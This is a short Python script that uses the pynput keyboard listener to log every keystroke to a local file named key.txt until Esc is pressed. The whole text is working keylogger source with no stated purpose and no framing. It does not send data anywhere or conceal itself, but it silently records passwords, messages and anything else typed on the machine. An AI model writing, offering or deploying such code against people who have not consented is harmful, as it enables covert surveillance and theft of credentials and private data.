from pynput.keyboard import Listener
def keypress(key):
    key = str(key)
    if key == "Key.esc":
        raise SystemExit(0)
    key = key.replace("'", "")
    if key == "Key.space":
        key = " "
    if key == "Key.enter":
        key = "\n"
    f = open('key.txt', 'a', encoding='utf8')
    f.write(key)
    f.close()
obj = Listener(on_press=keypress)
obj.start()
obj.join()